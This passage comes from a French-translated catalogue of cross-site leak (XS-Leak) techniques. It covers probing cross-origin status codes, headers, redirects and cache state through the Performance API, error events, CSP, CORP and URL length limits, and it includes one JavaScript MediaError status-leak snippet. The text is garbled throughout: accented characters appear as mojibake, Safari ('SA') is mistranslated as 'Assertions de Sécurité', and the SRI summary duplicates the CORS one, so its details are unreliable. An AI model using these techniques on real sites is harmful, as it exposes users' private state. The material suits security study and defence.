Cette richesse de donn√©es peut √™tre r√©cup√©r√©e via des m√©thodes comme [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) ou [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName), fournissant une vue compl√®te des informations li√©es √† la performance. De plus, l'API facilite la mesure des temps d'ex√©cution en calculant la diff√©rence entre les horodatages obtenus √† partir de [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now). Cependant, il convient de noter que pour certaines op√©rations dans des navigateurs comme Chrome, la pr√©cision de `performance.now()` peut √™tre limit√©e aux millisecondes, ce qui pourrait affecter la granularit√© des mesures de timing.

Au-del√† des mesures de timing, l'API de Performance peut √™tre exploit√©e pour des informations li√©es √† la s√©curit√©. Par exemple, la pr√©sence ou l'absence de pages dans l'objet `performance` dans Chrome peut indiquer l'application de `X-Frame-Options`. Plus pr√©cis√©ment, si une page est bloqu√©e de son rendu dans un cadre en raison de `X-Frame-Options`, elle ne sera pas enregistr√©e dans l'objet `performance`, fournissant un indice subtil sur les politiques de cadre de la page.

### Error Leak

* **Inclusion Methods**: Frames, √âl√©ments HTML
* **Detectable Difference**: Code d'√©tat
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Une requ√™te qui entra√Æne des erreurs ne cr√©era pas d'entr√©e de timing de ressource.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

Il est possible de **diff√©rencier entre les codes d'√©tat de r√©ponse HTTP** car les requ√™tes qui entra√Ænent une **erreur** ne **cr√©ent pas d'entr√©e de performance**.

### Style Reload Error

* **Inclusion Methods**: √âl√©ments HTML
* **Detectable Difference**: Code d'√©tat
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** En raison d'un bug du navigateur, les requ√™tes qui entra√Ænent des erreurs sont charg√©es deux fois.
* **Code Example**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

Dans la technique pr√©c√©dente, deux cas ont √©galement √©t√© identifi√©s o√π des bugs du navigateur dans GC entra√Ænent **le chargement de ressources deux fois lorsqu'elles √©chouent √† se charger**. Cela entra√Ænera plusieurs entr√©es dans l'API de Performance et peut donc √™tre d√©tect√©.

### Request Merging Error

* **Inclusion Methods**: √âl√©ments HTML
* **Detectable Difference**: Code d'√©tat
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Les requ√™tes qui entra√Ænent une erreur ne peuvent pas √™tre fusionn√©es.
* **Code Example**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

La technique a √©t√© trouv√©e dans un tableau dans le document mentionn√© mais aucune description de la technique n'a √©t√© trouv√©e. Cependant, vous pouvez trouver le code source en v√©rifiant [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

### Empty Page Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Contenu de la page
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Les r√©ponses vides ne cr√©ent pas d'entr√©es de timing de ressource.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

Un attaquant peut d√©tecter si une requ√™te a entra√Æn√© un corps de r√©ponse HTTP vide car **les pages vides ne cr√©ent pas d'entr√©e de performance dans certains navigateurs**.

### **XSS-Auditor Leak**

* **Inclusion Methods**: Frames
* **Detectable Difference**: Contenu de la page
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** En utilisant l'Auditeur XSS dans les Assertions de S√©curit√©, les attaquants peuvent d√©tecter des √©l√©ments sp√©cifiques de la page web en observant les modifications dans les r√©ponses lorsque des charges utiles con√ßues d√©clenchent le m√©canisme de filtrage de l'auditeur.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

Dans les Assertions de S√©curit√© (SA), l'Auditeur XSS, initialement destin√© √† pr√©venir les attaques de Cross-Site Scripting (XSS), peut paradoxalement √™tre exploit√© pour fuir des informations sensibles. Bien que cette fonctionnalit√© int√©gr√©e ait √©t√© supprim√©e de Google Chrome (GC), elle est toujours pr√©sente dans SA. En 2013, Braun et Heiderich ont d√©montr√© que l'Auditeur XSS pouvait bloquer involontairement des scripts l√©gitimes, entra√Ænant de faux positifs. S'appuyant sur cela, des chercheurs ont d√©velopp√© des techniques pour extraire des informations et d√©tecter un contenu sp√©cifique sur des pages d'origine crois√©e, un concept connu sous le nom de XS-Leaks, initialement rapport√© par Terada et √©labor√© par Heyes dans un article de blog. Bien que ces techniques soient sp√©cifiques √† l'Auditeur XSS dans GC, il a √©t√© d√©couvert que dans SA, les pages bloqu√©es par l'Auditeur XSS ne g√©n√®rent pas d'entr√©es dans l'API de Performance, r√©v√©lant une m√©thode par laquelle des informations sensibles pourraient encore √™tre divulgu√©es.

### X-Frame Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: En-t√™te
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
* **Summary:** Une ressource avec un en-t√™te X-Frame-Options ne cr√©e pas d'entr√©e de timing de ressource.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

Si une page n'est **pas autoris√©e** √† √™tre **rendu** dans un **iframe**, elle ne **cr√©e pas d'entr√©e de performance**. En cons√©quence, un attaquant peut d√©tecter l'en-t√™te de r√©ponse **`X-Frame-Options`**.\
Il en va de m√™me si vous utilisez une **balise embed**.

### Download Detection

* **Inclusion Methods**: Frames
* **Detectable Difference**: En-t√™te
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Les t√©l√©chargements ne cr√©ent pas d'entr√©es de timing de ressource dans l'API de Performance.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

De mani√®re similaire √† la fuite XS d√©crite, une **ressource qui est t√©l√©charg√©e** en raison de l'en-t√™te ContentDisposition ne **cr√©e pas non plus d'entr√©e de performance**. Cette technique fonctionne dans tous les navigateurs majeurs.

### Redirect Start Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Redirection
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** L'entr√©e de timing de ressource r√©v√®le le temps de d√©but d'une redirection.
* **Code Example**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

Nous avons trouv√© un cas de fuite XS qui abuse du comportement de certains navigateurs qui enregistrent trop d'informations pour les requ√™tes d'origine crois√©e. La norme d√©finit un sous-ensemble d'attributs qui doivent √™tre d√©finis √† z√©ro pour les ressources d'origine crois√©e. Cependant, dans **SA**, il est possible de d√©tecter si l'utilisateur est **redirig√©** par la page cible, en interrogeant l'**API de Performance** et en v√©rifiant les **donn√©es de timing redirectStart**.

### Duration Redirect Leak

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Redirection
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** La dur√©e des entr√©es de timing est n√©gative lorsqu'une redirection se produit.
* **Code Example**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

Dans GC, la **dur√©e** pour les requ√™tes qui entra√Ænent une **redirection** est **n√©gative** et peut donc √™tre **distingu√©e** des requ√™tes qui ne r√©sultent pas en une redirection.

### CORP Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: En-t√™te
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Les ressources prot√©g√©es par CORP ne cr√©ent pas d'entr√©es de timing de ressource.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

Dans certains cas, l'entr√©e **nextHopProtocol** peut √™tre utilis√©e comme une technique de fuite. Dans GC, lorsque l'en-t√™te **CORP** est d√©fini, le nextHopProtocol sera **vide**. Notez que SA ne cr√©era pas d'entr√©e de performance du tout pour les ressources activ√©es par CORP.

### Service Worker

* **Inclusion Methods**: Frames
* **Detectable Difference**: Utilisation de l'API
* **More info**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
* **Summary:** D√©tecter si un service worker est enregistr√© pour une origine sp√©cifique.
* **Code Example**:

Les service workers sont des contextes de script d√©clench√©s par des √©v√©nements qui s'ex√©cutent √† une origine. Ils s'ex√©cutent en arri√®re-plan d'une page web et peuvent intercepter, modifier et **mettre en cache des ressources** pour cr√©er des applications web hors ligne.\
Si une **ressource mise en cache** par un **service worker** est acc√©d√©e via **iframe**, la ressource sera **charg√©e √† partir du cache du service worker**.\
Pour d√©tecter si la ressource a √©t√© **charg√©e √† partir du cache du service worker**, l'**API de Performance** peut √™tre utilis√©e.\
Cela pourrait √©galement √™tre fait avec une attaque de timing (voir le document pour plus d'infos).

### Cache

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Timing
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
* **Summary:** Il est possible de v√©rifier si une ressource a √©t√© stock√©e dans le cache.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](https://xsinator.com/testing.html#Cache%20Leak%20\(POST\))

En utilisant l'[API de Performance](./#performance-api), il est possible de v√©rifier si une ressource est mise en cache.

### Network Duration

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Contenu de la page
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
* **Summary:** Il est possible de r√©cup√©rer la dur√©e r√©seau d'une requ√™te √† partir de l'API `performance`.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Technique des Messages d'Erreur

### Media Error

* **Inclusion Methods**: √âl√©ments HTML (Vid√©o, Audio)
* **Detectable Difference**: Code d'√©tat
* **More info**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
* **Summary:** Dans Firefox, il est possible de fuir avec pr√©cision le code d'√©tat d'une requ√™te d'origine crois√©e.
* **Code Example**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
L'interface `MediaError` a une propri√©t√© message qui identifie de mani√®re unique les ressources qui se chargent avec succ√®s gr√¢ce √† une cha√Æne distincte. Un attaquant peut exploiter cette fonctionnalit√© en observant le contenu du message, d√©duisant ainsi l'√©tat de r√©ponse d'une ressource cross-origin.

### Erreur CORS

* **M√©thodes d'inclusion** : Fetch API
* **Diff√©rence d√©tectable** : En-t√™te
* **Plus d'infos** : [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **R√©sum√© :** Dans les Assertions de S√©curit√© (SA), les messages d'erreur CORS exposent involontairement l'URL compl√®te des requ√™tes redirig√©es.
* **Exemple de code** : [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Cette technique permet √† un attaquant d'**extraire la destination d'une redirection d'un site cross-origin** en exploitant la mani√®re dont les navigateurs bas√©s sur Webkit g√®rent les requ√™tes CORS. Plus pr√©cis√©ment, lorsqu'une **requ√™te activ√©e CORS** est envoy√©e √† un site cible qui √©met une redirection bas√©e sur l'√©tat de l'utilisateur et que le navigateur refuse ensuite la requ√™te, l'**URL compl√®te de la cible de la redirection** est divulgu√©e dans le message d'erreur. Cette vuln√©rabilit√© r√©v√®le non seulement le fait de la redirection, mais expose √©galement le point de terminaison de la redirection et tout **param√®tre de requ√™te sensible** qu'il peut contenir.

### Erreur SRI

* **M√©thodes d'inclusion** : Fetch API
* **Diff√©rence d√©tectable** : En-t√™te
* **Plus d'infos** : [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **R√©sum√© :** Dans les Assertions de S√©curit√© (SA), les messages d'erreur CORS exposent involontairement l'URL compl√®te des requ√™tes redirig√©es.
* **Exemple de code** : [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Un attaquant peut exploiter des **messages d'erreur verbeux** pour d√©duire la taille des r√©ponses cross-origin. Cela est possible gr√¢ce au m√©canisme d'Int√©grit√© des Sous-ressources (SRI), qui utilise l'attribut d'int√©grit√© pour valider que les ressources r√©cup√©r√©es, souvent depuis des CDN, n'ont pas √©t√© alt√©r√©es. Pour que le SRI fonctionne sur des ressources cross-origin, celles-ci doivent √™tre **activ√©es CORS** ; sinon, elles ne sont pas soumises √† des v√©rifications d'int√©grit√©. Dans les Assertions de S√©curit√© (SA), tout comme l'erreur CORS XS-Leak, un message d'erreur peut √™tre captur√© apr√®s qu'une requ√™te fetch avec un attribut d'int√©grit√© √©choue. Les attaquants peuvent d√©lib√©r√©ment **d√©clencher cette erreur** en assignant une **valeur de hachage fictive** √† l'attribut d'int√©grit√© de toute requ√™te. Dans SA, le message d'erreur r√©sultant r√©v√®le involontairement la longueur du contenu de la ressource demand√©e. Cette fuite d'information permet √† un attaquant de discerner des variations dans la taille de la r√©ponse, ouvrant la voie √† des attaques XS-Leak sophistiqu√©es.

### Violation/D√©tection CSP

* **M√©thodes d'inclusion** : Pop-ups
* **Diff√©rence d√©tectable** : Code d'√©tat
* **Plus d'infos** : [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **R√©sum√© :** En n'autorisant que le site des victimes dans le CSP, si nous y acc√©dons et qu'il essaie de rediriger vers un domaine diff√©rent, le CSP d√©clenchera une erreur d√©tectable.
* **Exemple de code** : [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

Un XS-Leak peut utiliser le CSP pour d√©tecter si un site cross-origin a √©t√© redirig√© vers une autre origine. Cette fuite peut d√©tecter la redirection, mais de plus, le domaine de la cible de redirection fuit. L'id√©e de base de cette attaque est de **permettre le domaine cible sur le site de l'attaquant**. Une fois qu'une requ√™te est √©mise vers le domaine cible, il **redirige** vers un domaine cross-origin. **CSP bloque** l'acc√®s √† celui-ci et cr√©e un **rapport de violation utilis√© comme technique de fuite**. Selon le navigateur, **ce rapport peut fuir l'emplacement cible de la redirection**.\
Les navigateurs modernes n'indiqueront pas l'URL vers laquelle il a √©t√© redirig√©, mais vous pouvez toujours d√©tecter qu'une redirection cross-origin a √©t√© d√©clench√©e.

### Cache

* **M√©thodes d'inclusion** : Frames, Pop-ups
* **Diff√©rence d√©tectable** : Contenu de la page
* **Plus d'infos** : [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **R√©sum√© :** Effacer le fichier du cache. Ouvre la page cible et v√©rifie si le fichier est pr√©sent dans le cache.
* **Exemple de code :**

Les navigateurs peuvent utiliser un cache partag√© pour tous les sites web. Quel que soit leur origine, il est possible de d√©duire si une page cible a **demand√© un fichier sp√©cifique**.

Si une page charge une image uniquement si l'utilisateur est connect√©, vous pouvez **invalider** la **ressource** (pour qu'elle ne soit plus mise en cache si elle l'√©tait, voir les liens d'informations suppl√©mentaires), **effectuer une requ√™te** qui pourrait charger cette ressource et essayer de charger la ressource **avec une mauvaise requ√™te** (par exemple, en utilisant un en-t√™te referer trop long). Si le chargement de la ressource **n'a pas d√©clench√© d'erreur**, c'est parce qu'elle a √©t√© **mise en cache**.

### Directive CSP

* **M√©thodes d'inclusion** : Frames
* **Diff√©rence d√©tectable** : En-t√™te
* **Plus d'infos** : [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
* **R√©sum√© :** Les directives d'en-t√™te CSP peuvent √™tre sond√©es √† l'aide de l'attribut iframe CSP, r√©v√©lant des d√©tails sur la politique.
* **Exemple de code** : [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Une nouvelle fonctionnalit√© dans Google Chrome (GC) permet aux pages web de **proposer une Politique de S√©curit√© de Contenu (CSP)** en d√©finissant un attribut sur un √©l√©ment iframe, avec des directives de politique transmises avec la requ√™te HTTP. Normalement, le contenu int√©gr√© doit **autoriser cela via un en-t√™te HTTP**, sinon une **page d'erreur est affich√©e**. Cependant, si l'iframe est d√©j√† r√©gie par un CSP et que la politique propos√©e n'est pas plus restrictive, la page se chargera normalement. Ce m√©canisme ouvre une voie pour un attaquant afin de **d√©tecter des directives CSP sp√©cifiques** d'une page cross-origin en identifiant la page d'erreur. Bien que cette vuln√©rabilit√© ait √©t√© marqu√©e comme corrig√©e, nos d√©couvertes r√©v√®lent une **nouvelle technique de fuite** capable de d√©tecter la page d'erreur, sugg√©rant que le probl√®me sous-jacent n'a jamais √©t√© compl√®tement r√©solu.

### **CORP**

* **M√©thodes d'inclusion** : Fetch API
* **Diff√©rence d√©tectable** : En-t√™te
* **Plus d'infos** : [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
* **R√©sum√© :** Les ressources s√©curis√©es par la Politique de Ressources Cross-Origin (CORP) g√©n√©reront une erreur lorsqu'elles sont r√©cup√©r√©es depuis une origine non autoris√©e.
* **Exemple de code** : [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

L'en-t√™te CORP est une fonctionnalit√© de s√©curit√© de plateforme web relativement nouvelle qui, lorsqu'elle est d√©finie, **bloque les requ√™tes cross-origin sans CORS vers la ressource donn√©e**. La pr√©sence de l'en-t√™te peut √™tre d√©tect√©e, car une ressource prot√©g√©e par CORP **g√©n√©rera une erreur lorsqu'elle est r√©cup√©r√©e**.

### CORB

* **M√©thodes d'inclusion** : √âl√©ments HTML
* **Diff√©rence d√©tectable** : En-t√™tes
* **Plus d'infos** : [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **R√©sum√©** : CORB peut permettre aux attaquants de d√©tecter quand l'**en-t√™te `nosniff` est pr√©sent** dans la requ√™te.
* **Exemple de code** : [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

V√©rifiez le lien pour plus d'informations sur l'attaque.

### Erreur CORS sur la mauvaise configuration de r√©flexion d'origine <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **M√©thodes d'inclusion** : Fetch API
* **Diff√©rence d√©tectable** : En-t√™tes
* **Plus d'infos** : [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **R√©sum√©** : Si l'en-t√™te Origin est r√©fl√©chi dans l'en-t√™te `Access-Control-Allow-Origin`, il est possible de v√©rifier si une ressource est d√©j√† dans le cache.
* **Exemple de code** : [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

Dans le cas o√π l'**en-t√™te Origin** est **r√©fl√©chi** dans l'en-t√™te `Access-Control-Allow-Origin`, un attaquant peut abuser de ce comportement pour essayer de **r√©cup√©rer** la **ressource** en mode **CORS**. Si une **erreur** **n'est pas** d√©clench√©e, cela signifie qu'elle a √©t√© **correctement r√©cup√©r√©e depuis le web**, si une erreur est **d√©clench√©e**, c'est parce qu'elle a √©t√© **acc√©d√©e depuis le cache** (l'erreur appara√Æt parce que le cache enregistre une r√©ponse avec un en-t√™te CORS autorisant le domaine d'origine et non le domaine de l'attaquant).\
Notez que si l'origine n'est pas r√©fl√©chie mais qu'un caract√®re g√©n√©rique est utilis√© (`Access-Control-Allow-Origin: *`), cela ne fonctionnera pas.

## Technique des Attributs Lisibles

### Redirection Fetch

* **M√©thodes d'inclusion** : Fetch API
* **Diff√©rence d√©tectable** : Code d'√©tat
* **Plus d'infos** : [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **R√©sum√© :** GC et SA permettent de v√©rifier le type de r√©ponse (opaque-redirect) apr√®s que la redirection soit termin√©e.
* **Exemple de code** : [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

Soumettre une requ√™te en utilisant l'API Fetch avec `redirect: "manual"` et d'autres param√®tres, il est possible de lire l'attribut `response.type` et s'il est √©gal √† `opaqueredirect`, alors la r√©ponse √©tait une redirection.

### COOP

* **M√©thodes d'inclusion** : Pop-ups
* **Diff√©rence d√©tectable** : En-t√™te
* **Plus d'infos** : [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **R√©sum√© :** Les pages prot√©g√©es par la Politique de Ouverture Cross-Origin (COOP) emp√™chent l'acc√®s aux interactions cross-origin.
* **Exemple de code** : [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

Un attaquant est capable de d√©duire la pr√©sence de l'en-t√™te Politique de Ouverture Cross-Origin (COOP) dans une r√©ponse HTTP cross-origin. COOP est utilis√© par les applications web pour emp√™cher les sites externes d'obtenir des r√©f√©rences de fen√™tres arbitraires. La visibilit√© de cet en-t√™te peut √™tre discern√©e en tentant d'acc√©der √† la **r√©f√©rence `contentWindow`**. Dans les sc√©narios o√π COOP est appliqu√© de mani√®re conditionnelle, la **propri√©t√© `opener`** devient un indicateur r√©v√©lateur : elle est **ind√©finie** lorsque COOP est actif, et **d√©finie** en son absence.

### Longueur Max de l'URL - C√¥t√© Serveur

* **M√©thodes d'inclusion** : Fetch API, √âl√©ments HTML
* **Diff√©rence d√©tectable** : Code d'√©tat / Contenu
* **Plus d'infos** : [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **R√©sum√© :** D√©tecter les diff√©rences dans les r√©ponses en raison de la longueur de la r√©ponse de redirection qui pourrait √™tre trop grande pour que le serveur r√©ponde avec une erreur et qu'une alerte soit g√©n√©r√©e.
* **Exemple de code** : [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

Si une redirection c√¥t√© serveur utilise **des donn√©es utilisateur √† l'int√©rieur de la redirection** et **des donn√©es suppl√©mentaires**. Il est possible de d√©tecter ce comportement car g√©n√©ralement **les serveurs** ont une **limite de longueur de requ√™te**. Si les **donn√©es utilisateur** sont de cette **longueur - 1**, parce que la **redirection** utilise **ces donn√©es** et **ajoute** quelque chose **de suppl√©mentaire**, cela d√©clenchera une **erreur d√©tectable via les √âv√©nements d'Erreur**.

Si vous pouvez d'une mani√®re ou d'une autre d√©finir des cookies pour un utilisateur, vous pouvez √©galement effectuer cette attaque en **d√©finissant suffisamment de cookies** ([**cookie bomb**](../hacking-with-cookies/cookie-bomb.md)) donc avec la **taille de r√©ponse augment√©e** de la **r√©ponse correcte**, une **erreur** est d√©clench√©e. Dans ce cas, rappelez-vous que si vous d√©clenchez cette requ√™te depuis un m√™me site, `<script>` enverra automatiquement les cookies (vous pouvez donc v√©rifier les erreurs).\
Un exemple de **cookie bomb + XS-Search** peut √™tre trouv√© dans la solution pr√©vue de cette r√©daction : [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

`SameSite=None` ou √™tre dans le m√™me contexte est g√©n√©ralement n√©cessaire pour ce type d'attaque.

### Longueur Max de l'URL - C√¥t√© Client

* **M√©thodes d'inclusion** : Pop-ups
* **Diff√©rence d√©tectable** : Code d'√©tat / Contenu
* **Plus d'infos** : [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
* **R√©sum√© :** D√©tecter les diff√©rences dans les r√©ponses en raison de la longueur de la r√©ponse de redirection qui pourrait √™tre trop grande pour qu'une diff√©rence puisse √™tre remarqu√©e.
* **Exemple de code** : [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

Selon la [documentation de Chromium](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url_display_guidelines/url_display_guidelines.md#URL-Length), la longueur maximale d'URL de Chrome est de 2 Mo.

> En g√©n√©ral, la _plateforme web_ n'a pas de limites sur la longueur des URL (bien que 2^31 soit une limite courante). _Chrome_ limite les URL √† une longueur maximale de **2 Mo** pour des raisons pratiques et pour √©viter de causer des probl√®mes de d√©ni de service dans la communication inter-processus.

Par cons√©quent, si l'**URL de redirection r√©pond est plus grande dans l'un des cas**, il est possible de la faire rediriger avec une **URL plus grande que 2 Mo** pour atteindre la **limite de longueur**. Lorsque cela se produit, Chrome affiche une page **`about:blank#blocked`**.

La **diff√©rence notable**, est que si la **redirection** a √©t√© **compl√©t√©e**, `window.origin` g√©n√®re une **erreur** car un cross-origin ne peut pas acc√©der √† cette info. Cependant, si la **limite** a √©t√© \*\*\*\* atteinte et que la page charg√©e √©tait **`about:blank#blocked`**, l'**origine** de la fen√™tre reste celle du **parent**, ce qui est une **information accessible.**

Toutes les informations suppl√©mentaires n√©cessaires pour atteindre les **2 Mo** peuvent √™tre ajout√©es via un **hash** dans l'URL initiale afin qu'il soit **utilis√© dans la redirection**.

{% content-ref url="url-max-length-client-side.md" %}
[url-max-length-client-side.md](url-max-length-client-side.md)
{% endcontent-ref %}

### Max Redirections

* **M√©thodes d'inclusion** : Fetch API, Frames
* **Diff√©rence d√©tectable** : Code d'√©tat
* **Plus d'infos** : [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76)
